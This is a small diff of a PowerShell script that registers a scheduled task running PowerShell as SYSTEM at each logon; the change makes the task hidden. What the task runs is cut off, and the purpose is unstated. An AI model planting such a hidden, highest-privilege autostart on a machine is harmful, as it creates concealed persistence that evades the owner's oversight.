@@ -5,4 +5,4 @@ $action = New-ScheduledTaskAction -Execute "C:\Windows\System32\WindowsPowerShel
 $trigger = New-ScheduledTaskTrigger -AtLogon
 $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
 $settings = New-ScheduledTaskSettingsSet -Hidden
-Register-ScheduledTask "$taskname" -Action $action -Trigger $trigger -Principal $principal
+Register-ScheduledTask "$taskname" -Action $action -Trigger $trigger -Principal $principal -Settings $settings
